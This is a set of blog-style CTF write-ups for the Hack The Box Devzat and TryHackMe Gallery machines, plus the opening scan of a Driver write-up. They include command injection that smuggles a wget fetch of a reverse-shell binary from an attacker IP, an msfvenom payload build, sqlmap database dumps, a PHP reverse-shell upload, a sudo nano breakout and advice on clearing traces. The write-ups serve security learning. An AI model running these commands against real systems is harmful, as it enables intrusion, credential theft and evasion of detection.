[{"content":"Overview Welcome to Devzat machine from Hack The Box! The general theme of this machine is only Golang code exploitation, with a tip here and a trick there - nothing special in particular.\nWe\u0026rsquo;re going to have lots to cover, so let\u0026rsquo;s get going.\nI. Reconnaisance 1. Port scan tl;dr: Do port scan, check the opening services.  Before start with a port scan, I tried to open the address in a browser first:\n  It redirected us to devzat.htb  So let\u0026rsquo;s add this line to our /etc/hosts file real quick:\n10.10.11.118 devzat.htb And run the port scan.\n# Nmap 7.92 scan initiated Sun Feb 27 03:27:07 2022 as: nmap -sC -sV -oN nmap-rescan-after-add-hosts.txt devzat.htb Nmap scan report for devzat.htb (10.10.11.118) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: devzat - where the devs at |_http-server-header: Apache/2.4.41 (Ubuntu) 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.92%I=7%D=2/27%Time=621B35FB%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Feb 27 03:28:14 2022 -- 1 IP address (1 host up) scanned in 66.71 seconds Reload the web page, here\u0026rsquo;s what was shown.\n  First landing page with Bootstrap design  You can see the full landing page here, but to come to the point here\u0026rsquo;s what it told us to do:\n  Instructions for connecting to port 8000  At this point I got curious about what Devzat is, so I searched it up:\n  It turned out to be an open-source chat service, run over SSH and created in Golang. They even have a public server at devzat.hackclub.com!\n2. Play with chat service Upon connecting to port 80 for the first time, the server slapped an error in my face:\n$ ssh -l aki devzat.htb -p 8000 Unable to negotiate with 10.10.11.118 port 8000: no matching host key type found. Their offer: ssh-rsa If you wonder what was the problem\u0026rsquo;s root, please refer to this AskUbuntu question. Briefly, we need to modify the given command a bit:\n I quickly picked up the chat functions, mainly because it\u0026rsquo;s quite like Discord. Take a look at the service in action:\n However, no where in this service looked vulnerable, not even in Github changelogs, any public exploit nor customization. But keep this service in mind as it will prove to be useful in privilege escalating section.\nII. User flag 1. Subdomain exploration tl;dr: Brute force and discover a subdomain with wfuzz  Come to think of it, a web service calling for amendment in /etc/hosts must hide something in its subdomains. Therefore, I hammered it.\nwfuzz --oF wfuzz -c -f wfuzz.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#34;http://devzat.htb\u0026#34; -H \u0026#34;Host: FUZZ.devzat.htb\u0026#34; --hc 301,302 After a few minutes, something novel was returned: Let\u0026rsquo;s also add that to /etc/hosts:\n10.10.11.118 pets.devzat.htb Navigate there in a browser, and here\u0026rsquo;s the outcome:  Nothing in this image was interactive  At the bottom of that page, there was a pet adding function:\n  A function that looks vulnerable  Without much notion about what to do, I tried to insert a wildcard there, thinking it would cause a SQL wildcard attack.\n  Surprisingly, the asterisk wildcard worked  Looking into Burp Suite, the request looks somewhat like this:\nPOST /api/pet HTTP/1.1 Host: pets.devzat.htb Content-Length: 37 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://pets.devzat.htb Referer: http://pets.devzat.htb/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close  {  \u0026#34;name\u0026#34;:\u0026#34;*\u0026#34;,  \u0026#34;species\u0026#34;:\u0026#34;*\u0026#34; } Inspite of that, other forms of SQL injection didn\u0026rsquo;t work. Consequently, I gave up the SQL injection path and look for other attack vectors.\n2. Git repository reconstruction tl;dr: Discover a Git repository and see to its source code  Following my nose, I started a brute force scan with Gobuster.\n See that error at the end? It meant the server was tricking us by returning HTTP status 200 for every requests. For that reason, let\u0026rsquo;s exlude all those fake responses and run the scan once again.\ngobuster dir -u http://pets.devzat.htb/ -t 20 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --exclude-length 510  Nice. We\u0026rsquo;re forbidden to access the /server-status endpoint, but look at that .git! That\u0026rsquo;s a whole gold mine waiting to be explored!\nYou can see for yourself the exposed .git folder pentesting method on Pentest Monkey blog. For now, just bear in mind that you can reconstruct a whole Git repository from only .git folder. Here is an instruction:\n Step 1. Download the needed script: wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh Step 2. Run the script: bash gitdumper.sh http://pets.devzat.htb/.git/ ./pets  Step 3. Run git checkout -- . to recover the Git repository. Step 4. Profit.   Simple and easy, right?\nA minor notice - up to this point I had had no prior experience with Golang whatsoever. But somehow the Go syntax still made sense to me, and this function specifically caught my attention:\nfunc loadCharacter(species string) string {  cmd := exec.Command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;cat characteristics/\u0026#34;+species)  stdoutStderr, err := cmd.CombinedOutput()  if err != nil {  return err.Error()  }  return string(stdoutStderr) } Looking at that exec.Command, one cannot help but to think of a OS command injection!\n  Tried inserting ;id on the pets site  It worked! And what\u0026rsquo;s more - the user running this web app was not www-data! That saved us a phase of privilege escalation.\n3. Acquiring foothold tl;dr: Leverage limited RCE to reverse shell using msfvenom  With a somewhat limited RCE in our hand right now, it should be a piece of cake getting a reverse shell and retrieving our user flag!\nIf only life was that easy.\nFor some mysterious reasons, all reverse shell commands quickly died right at the moment it managed to call back - no matter it\u0026rsquo;s bash, python or go, no matter it\u0026rsquo;s running as a foreground or background process, it just - die. As the last resort, I had to rely on msfvenom, like this:\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=\u0026lt;YOUR_IP\u0026gt; LPORT=9999 -f elf -o reverse.elf Then load it to the server using:\ncurl -X POST -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;*\u0026#34;, \u0026#34;species\u0026#34;:\u0026#34;; wget http://\u0026lt;YOUR_IP\u0026gt;/reverse.elf\u0026#34;}\u0026#39; http://pets.devzat.htb/api/pet Don\u0026rsquo;t forget to open a HTTP server first:\npython3 -m http.server 80 You can see a shell call back in an instant!\n$ nc -lvnp 9999 listening on [any] 9999... connect to [\u0026lt;YOUR_IP\u0026gt;] from (UNKNOWN) [10.10.11.118] 47172 id uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) Looking into patrick\u0026rsquo;s ~/.ssh directory, I found his id_rsa key. Without further ado, I downloaded it, and SSH in (personally I sent it to that previous .git folder then wget it there, but how to do this part depends on your creativity).\n  The end result of this section  4. Horizontal privilege escalation tl;dr: Discover and attack Influx Database to get other users\u0026rsquo; credentials  Unfortunately, after all those hassles, the user.txt flag was still out of our reach - it turned out to be in some other user\u0026rsquo;s home directory whose username was catherine.\nTo give you an overview about our targets, here\u0026rsquo;s their /etc/passwd file:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin patrick:x:1000:1000:patrick:/home/patrick:/bin/bash catherine:x:1001:1001:catherine,,,:/home/catherine:/bin/bash usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin And here are the opening ports.\npatrick@devzat:~$ ss -lntup Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8086 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8443 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:5000 0.0.0.0:* users:((\u0026#34;petshop\u0026#34;,pid=855,fd=3)) tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:8000 *:* users:((\u0026#34;devchat\u0026#34;,pid=856,fd=7)) tcp LISTEN 0 511 *:80 *:* My attention quickly felt on that port 8086. Checking the processes, there\u0026rsquo;s also something really shady running on the background.\nroot 1279 1 0 05:28 ? 00:00:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id bcf2dac78cc0f71f3ae09bb2d70be065cd4bc8df3cfcc6d4c1b070c64f1ba804 -address /run/containerd/containerd.sock root 1301 1279 0 05:28 ? 00:00:23 \\_ influxdb A SQL-like syntax database - InfluxDB. Looking for public vulnerabilities on ExploitDB yeilded no result. On the other hand, Github actually gave us something:\n Instructions are laid out pretty clear on its README. I would also say this is one of the most stable, eye-candy looking shells that I have had a chance to use.\nLooking around in the database for a while, I finally got my hand on the million-dollar piece of information. And it seems like catherine reused her credentials, because I could easily logged in her account using that password:\npatrick@devzat:~$ su catherine Password: catherine@devzat:/home/patrick$ id uid=1001(catherine) gid=1001(catherine) groups=1001(catherine) With this, now the user flag is in our hand.\nIII. LFI - Root flag tl;dr: Discover backup and use hard-corded password to get LFI as root  There\u0026rsquo;s a small side story you need to know: at the time of writing\u0026hellip;\n CVE-2021-4034, (in)famously known as the \u0026ldquo;Pwnkit exploit\u0026rdquo;, still worked. I will not guide you on this \u0026ldquo;dark side of the Force\u0026rdquo; path, but you should be able to pull off the trick if you\u0026rsquo;ve gotten this far.\nIf you insists on going the intended exploit path, then first, take a look at the running processes:\nroot 832 1 0 05:27 ? 00:00:00 /bin/bash /root/devzat/start.sh root 857 832 0 05:27 ? 00:00:00 \\_ ./devchat Baffling enough, root was running a devchat instance! So where was it exposing to?\nOut of all opening ports, we can see that port 8443 had the most potential.\nJust for personal preference, I forwarded it to my local first.\nssh -i id_rsa -L 8443:127.0.0.1:8443 patrick@devzat.htb And then connect to it with:\nssh -l aki 127.0.0.1 -p 8443 You can clearly see there\u0026rsquo;s a weird command deemed as \u0026ldquo;alpha\u0026rdquo; in this instance: At first I thought that would be an obvious local file read vulnerability, but man, if only life was that easy:\naki: /file /root/root.txt [SYSTEM] You need to provide the correct password to use this function aki: /file /root/root.txt somepassword [SYSTEM] You did provide the wrong password The bad thing is, except from that exact command, nothing else was abnormal.\nAnd it was that moment that an idea suddenly flashed through my mind - will I see others\u0026rsquo; messages if I log in with their username?  Some really nasty secret chat going on  What about catherine?\n Well, I came looking for copper - but I found gold!\nJust a side story, well, no matter how many ctfs I have done, I cannot help but feel a bit illegal reading others\u0026rsquo; chat messages, even when it\u0026rsquo;s fictional\u0026hellip;\nMoving on, I think we could look for backups with a fairly simple command, like this:\ncatherine@devzat:~$ find / -name \u0026#34;*backup*\u0026#34; 2\u0026gt;/dev/null /snap/core18/2128/usr/share/bash-completion/completions/vgcfgbackup /snap/core18/2128/var/backups /snap/core18/2074/usr/share/bash-completion/completions/vgcfgbackup /snap/core18/2074/var/backups /usr/sbin/vgcfgbackup /usr/share/man/man8/vgcfgbackup.8.gz /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl /usr/share/bash-completion/completions/vgcfgbackup /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so /usr/lib/modules/5.4.0-77-generic/kernel/drivers/net/team/team_mode_activebackup.ko /usr/lib/modules/5.4.0-77-generic/kernel/drivers/power/supply/wm831x_backup.ko /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc /usr/src/linux-headers-5.4.0-77/tools/testing/selftests/net/tcp_fastopen_backup_key.sh /usr/src/linux-headers-5.4.0-77-generic/include/config/wm831x/backup.h /usr/src/linux-headers-5.4.0-77-generic/include/config/net/team/mode/activebackup.h /sys/devices/virtual/net/vethbb59ceb/brport/backup_port /var/backups Without a doubt, that /var/backups was absolutely suspicious:\ncatherine@devzat:~$ cd /var/backups catherine@devzat:/var/backups$ ls alternatives.tar.0 apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz devzat-dev.zip devzat-main.zip dpkg.diversions.0 dpkg.statoverride.0 dpkg.status.0 As you can see, both the main and dev version were there. So I opened a simple Python HTTP server and downloaded them onto my machine for further inspection. You can also do the next steps on the remote machine if you want, but you know, that\u0026rsquo;s just personal preference.\nUpon running diff dev main, a whole bunch of things jumped out.\ndiff dev/allusers.json main/allusers.json 1c1,3 \u0026lt; {} --- \u0026gt; { \u0026gt; \u0026#34;eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3\u0026#34;: \u0026#34;\\u001b[38;5;214mtest\\u001b[39m\u0026#34; \u0026gt; } diff dev/commands.go main/commands.go 4d3 \u0026lt; \u0026#34;bufio\u0026#34; 6,7d4 \u0026lt; \u0026#34;os\u0026#34; \u0026lt; \u0026#34;path/filepath\u0026#34; 40d36 \u0026lt; file = commandInfo{\u0026#34;file\u0026#34;, \u0026#34;Paste a files content directly to chat [alpha]\u0026#34;, fileCommand, 1, false, nil} 42,101c38 \u0026lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} \u0026lt; } \u0026lt; \u0026lt; func fileCommand(u *user, args []string) { \u0026lt; if len(args) \u0026lt; 1 { \u0026lt; u.system(\u0026#34;Please provide file to print and the password\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; if len(args) \u0026lt; 2 { \u0026lt; u.system(\u0026#34;You need to provide the correct password to use this function\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; path := args[0] \u0026lt; pass := args[1] \u0026lt; \u0026lt; // Check my secure password \u0026lt; if pass != \u0026#34;CeilingCatStillAThingIn2021?\u0026#34; { \u0026lt; u.system(\u0026#34;You did provide the wrong password\u0026#34;) \u0026lt; return \u0026lt; } \u0026lt; \u0026lt; // Get CWD \u0026lt; cwd, err := os.Getwd() \u0026lt; if err != nil { \u0026lt; u.system(err.Error()) \u0026lt; } \u0026lt; \u0026lt; // Construct path to print \u0026lt; printPath := filepath.Join(cwd, path) \u0026lt; \u0026lt; // Check if file exists \u0026lt; if _, err := os.Stat(printPath); err == nil { \u0026lt; // exists, print \u0026lt; file, err := os.Open(printPath) \u0026lt; if err != nil { \u0026lt; u.system(fmt.Sprintf(\u0026#34;Something went wrong opening the file: %+v\u0026#34;, err.Error())) \u0026lt; return \u0026lt; } \u0026lt; defer file.Close() \u0026lt; \u0026lt; scanner := bufio.NewScanner(file) \u0026lt; for scanner.Scan() { \u0026lt; u.system(scanner.Text()) \u0026lt; } \u0026lt; \u0026lt; if err := scanner.Err(); err != nil { \u0026lt; u.system(fmt.Sprintf(\u0026#34;Something went wrong printing the file: %+v\u0026#34;, err.Error())) \u0026lt; } \u0026lt; \u0026lt; return \u0026lt; \u0026lt; } else if os.IsNotExist(err) { \u0026lt; // does not exist, print error \u0026lt; u.system(fmt.Sprintf(\u0026#34;The requested file @ %+v does not exist!\u0026#34;, printPath)) \u0026lt; return \u0026lt; } \u0026lt; // bokred? \u0026lt; u.system(\u0026#34;Something went badly wrong.\u0026#34;) --- \u0026gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} diff dev/devchat.go main/devchat.go 27c27 \u0026lt; port = 8443 --- \u0026gt; port = 8000 114c114 \u0026lt; fmt.Sprintf(\u0026#34;127.0.0.1:%d\u0026#34;, port), --- \u0026gt; fmt.Sprintf(\u0026#34;:%d\u0026#34;, port), Only in dev: testfile.txt See the password? Well, to be honest, hard-coded passwords are common in development phase. That being the case, we\u0026rsquo;ll gratefully use that password and exploit the LFI vulnerability, as root.\nAt this point you should be able to read the root flag at /root/root.txt. If instead, you want to go \u0026ldquo;further and beyond\u0026rdquo; to get a full-fledged root shell, you can look for \u0026ldquo;LFI to reverse shell\u0026rdquo; - there\u0026rsquo;re ample guides on Google. More creatively, there maybe is a SSH key in /root/.ssh, or just grab the /etc/shadow file and start cracking it - it all depends on your imagination.\nIV. House cleaning tl;dr: Clean all traces before secretly leaving  1. The id_rsa file in .git folder This one is easy. Just delete it from wherever you put it earlier.\n2. History and logs Bash history had been set as symlinks to /dev/null from the very beginning, so it\u0026rsquo;s not a concern.\nV. Final words This blog post turned out to be much lenghthier than I expected, but I\u0026rsquo;ve had lots of fun while learnt a ton along the way - and hopefully, you too!\n","permalink":"https://git-akihakune.github.io/blog/devzat/","summary":"Multi-exploit chain to get root on a Go application","title":"Hack The Box - Devzat"},{"content":"Overview Welcome to Try Hack Me\u0026rsquo;s Gallery! In short, this box is all about SQL injection - inject all the way to get a shell, then exploit a command that we can run as root to get the flag!\nI. Reconnaisance tl;dr: Scan for open ports, find out a login form. Perform a SQL injection to log in. Here\u0026rsquo;s the port scan result:\n# Nmap 7.92 scan initiated Thu Feb 17 04:55:27 2022 as: nmap -sC -sV -oN nmap.txt 10.10.177.242 Nmap scan report for 10.10.177.242 Host is up (0.40s latency). Not shown: 3998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Simple Image Gallery System | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 17 05:13:08 2022 -- 1 IP address (1 host up) scanned in 1061.16 seconds This should answer the first question - how many ports are opening.\nGoing into details, here\u0026rsquo;s what\u0026rsquo;s on port 80.\n Just a standard Apache page. There was absolutely nothing abnormal in the source code. Normally we would look for subdirectories or subdomains in times like this, but for now, let\u0026rsquo;s see to port 8080 first:\n A simple login form. Testing it against some widely used default credentials, the app did not let us in. Its source code, on the other hand, did have something: However, /forgot-password.html end point, in fact, returned a standard 404 error:\n$ curl http://10.10.69.246/gallery/forgot-password.html \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on this server.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at 10.10.69.246 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Take another look at browser\u0026rsquo;s DevTool, it showed something genuinely noteworthy.\n Embedded in the HTTP response is a SQL query, as if it\u0026rsquo;s tempting us to do a SQL injection. From the most basic one first:\n \u0026hellip;Well?\n Why didn\u0026rsquo;t it work? Before we continue, can you figure out why?\nA bit agonizing, self-doubting and Googling, I realized that it should have been =, not ==. The result of a month working in NoSQL fully unveiled before my eyes.\nAfter that slight amendation, the app let us in as Administrator.\n II. CME attack - database tl;dr: Use a public exploit of the CME to get data within the MySQL database. I looked around in the web app, and even as Administrator, it didn\u0026rsquo;t exposed anything remarkable. If the vulnerability was not in the content or configuration, it must be in the app itself. Therefore, to no one surprise, several public exploits can be found in no time using searchsploit:\n$ searchsploit \u0026#34;Simple Image Gallery\u0026#34; ---------------------------------------------- ---------------------------------  Exploit Title | Path ---------------------------------------------- --------------------------------- Joomla Plugin Simple Image Gallery Extended ( | php/webapps/49064.txt Joomla! Component Kubik-Rubik Simple Image Ga | php/webapps/44104.txt Simple Image Gallery 1.0 - Remote Code Execut | php/webapps/50214.py Simple Image Gallery System 1.0 - \u0026#39;id\u0026#39; SQL In | php/webapps/50198.txt ---------------------------------------------- --------------------------------- Shellcodes: No Results How convenient it is to have a RCE PoC right on line 3. However, for some god-know reason, the Python script didn\u0026rsquo;t work for me. As a consequence, we had to manually SQL inject it. Here are the instructed steps:\nStep 1. Login to the application with any verified user credentials  Step 2. Click on Albums page and select an albums if created or create by clicking on \u0026#34;Add New\u0026#34; on the top right and select the album.  Step 3. Click on an image and capture the request in burpsuite. Now copy the request and save it as test.req .  Step 4. Run the sqlmap command \u0026#34;sqlmap -r test.req --dbs  Step 5. This will inject successfully and you will have an information disclosure of all databases contents. At least, that was the initial plan. Everything went smoothly until step 4, when I ran this command:\nsqlmap -r test.req --dbs Unexpectedly, I received this:\n[WARNING] most likely web server instance hasn\u0026#39;t recovered yet from previous timed based payload. For that reason, I had to change the commands a bit. Here is a sequence of sqlmap commands that I ran:\n# discover databases $ sqlmap -r test.req --dbs --flush-session --technique=BEUS available databases [2]: [*] gallery_db [*] information_schema # discover tables sqlmap -r test.req --tables -D gallery_db tabase: gallery_db [4 tables] +-------------+ | album_list | | images | | system_info | | users | +-------------+ # get columns of a table sqlmap -r test.req --columns -D gallery_db -T users --threads 4 Database: gallery_db Table: users [10 columns] +--------------+--------------+ | Column | Type | +--------------+--------------+ | avatar | text | | date_added | datetime | | date_updated | datetime | | firstname | varchar(250) | | id | int(50) | | last_login | datetime | | lastname | varchar(250) | | password | text | | type | tinyint(1) | | username | text | +--------------+--------------+ # extract data from table sqlmap -r test.req --dump -D gallery_db -T users --threads 4 Database: gallery_db Table: users [1 entry] +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ | id | type | avatar | lastname | password | username | firstname | date_added | last_login | date_updated | +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ | 1 | 1 | uploads/1629883080_1624240500_avatar.png | Admin | 0f18fd4cf40bfb1dec646807c7fa5522 (lmao) | admin | Adminstrator | 2021-01-20 14:02:37 | NULL | 2022-02-23 08:55:43 | +----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+ That password\u0026hellip; isn\u0026rsquo;t that the very password that I set earlier? It it the answer to a THM question? Was I not supposed to change it?\nAs a result, I had to restart the machine and run the exact command once again.\nDatabase: gallery_db Table: users [1 entry] +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ | id | type | avatar | lastname | password | username | firstname | date_added | last_login | date_updated | +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ | 1 | 1 | uploads/1629883080_1624240500_avatar.png | Admin | \u0026lt;REDACTED\u0026gt; | admin | Adminstrator | 2021-01-20 14:02:37 | NULL | 2021-08-25 09:18:12 | +----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+ III. CME attack - reverse shell tl;dr: Upload PHP reverse shell, got reverse shell This one was disappointingly facile. There was an option to upload the image in the web app, so I tried to upload a standard PHP reverse shell from Pentest Monkey. Then open the image.\nStrangely, my long-waited netcat listener received a call back.\n$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) IV. Privilege escalation - user tl;dr: Escalate to user privilege using credentials in .bash_history Yes, as you have just read. This fictional user foolishly typed his password into a bash command. You just need to look for it in a back up.\n$ find / -name \u0026#34;*backup*\u0026#34; 2\u0026gt;/dev/null # One of the top commands you should run when you get a shell usr/src/linux-headers-4.15.0-167-generic/include/config/wm831x/backup.h /usr/src/linux-headers-4.15.0-154-generic/include/config/wm831x/backup.h /etc/lvm/backup /var/backups Apparently, we see to /var/backups.\n$ ls /var/backups apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz apt.extended_states.3.gz mike_home_backup What\u0026rsquo;s there in mike_home_backup directory?\n$ ls /var/backups/mike_home_backup accounts.txt Interestingly, this accounts.txt file is just a trap.\n$ cat accounts.txt Spotify : mike@gmail.com:mycat666 Netflix : mike@gmail.com:123456789pass TryHackme: mike:darkhacker123 Ther real credentials lies at /var/backups/mike_home_backup/.bash_history, right here:\n$ cat /var/backups/mike_home_backup/.bash_history cat .bash_history cd ~ ls ping 1.1.1.1 cat /home/mike/user.txt cd /var/www/ ls cd html ls -al cat index.html sudo -l\u0026lt;REDACTED\u0026gt; clear sudo -l exit See? Now run su mike, enter the password, and see what\u0026rsquo;s left.\nmike@gallery:/var/backups/mike_home_backup$ id id uid=1001(mike) gid=1001(mike) groups=1001(mike) V. Privilege Escalation - root tl;dr: Exploit a script that user can run as root A second in and I immediately know where to look to:\nmike@gallery:/var/backups/mike_home_backup$ sudo -l sudo -l Matching Defaults entries for mike on gallery:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User mike may run the following commands on gallery:  (root) NOPASSWD: /bin/bash /opt/rootkit.sh So we can run /opt/rootkit.sh as root. By the way, we can also read it:\n#!/bin/bash  read -e -p \u0026#34;Would you like to versioncheck, update, list or read the report ? \u0026#34; ans;  # Execute your choice case $ans in  versioncheck)  /usr/bin/rkhunter --versioncheck ;;  update)  /usr/bin/rkhunter --update;;  list)  /usr/bin/rkhunter --list;;  read)  /bin/nano /root/report.txt;;  *)  exit;; esac Seems like a script to check for rootkit. Ironically, the script to check for rootkit is a rootkit itself.\nTake a look at that read option, do you see that we can run nano as root? According to GTFOBins, that much is enough to break out and get a shell.\n Type exactly that, character-by-character, we broke out of nano and got the root shell.\n# id uid=0(root) gid=0(root) groups=0(root) # cd /root # ls report.txt root.txt And that\u0026rsquo;s all. A pretty basic challenge. Hope you\u0026rsquo;ve enjoyed it!\n","permalink":"https://git-akihakune.github.io/blog/gallery/","summary":"A great beginner machine to learn SQL injection","title":"Try Hack Me - Gallery"},{"content":"Overview To cut a long story short, this is a Windows machine that has an opening web page with guessable credentials, gave us a file upload portal through which can be used to trigger SCF file upload vulnerability, subsequently granted us a shell via WinRM, which showed us a vulnerable printing service that we can take advantage of to get Administrator shell.\nI. Scanning So basically, it\u0026rsquo;s a Windows box with Samba shares and HTTP port opening.\n# Nmap 7.92 scan initiated Thu Feb 3 21:46:00 2022 as: nmap -sC -sV -p- -oN nmap-fullports.txt driver.htb Nmap scan report for driver.htb Host is up (0.039s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-02-04T09:47:57 |_ start_date: 2022-02-03T15:59:59 |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 